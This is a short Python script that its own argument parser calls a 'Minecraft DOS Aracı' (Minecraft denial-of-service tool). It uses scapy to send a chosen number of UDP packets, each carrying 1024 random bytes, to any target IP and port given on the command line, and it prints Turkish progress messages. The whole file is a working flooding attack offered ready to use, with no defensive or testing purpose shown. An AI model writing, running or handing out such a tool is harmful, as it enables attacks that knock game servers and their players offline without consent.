import argparse
import random
import threading
from scapy.all import *
from colorama import init, Fore

init(autoreset=True)

def udp_flood(target_ip, target_port, packet_count):
    for i in range(packet_count):
        packet = IP(dst=target_ip) / UDP(dport=target_port) / Raw(load=random._urandom(1024))
        send(packet, verbose=False)
        print(Fore.GREEN + f"[+] Paket gönderildi {i+1}/{packet_count}")

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Minecraft DOS Aracı")
    parser.add_argument("ip", type=str, help="Hedef IP")
    parser.add_argument("port", type=int, help="Hedef Port")
    parser.add_argument("count", type=int, help="Paket Sayısı")

    args = parser.parse_args()
    udp_flood(args.ip, args.port, args.count)
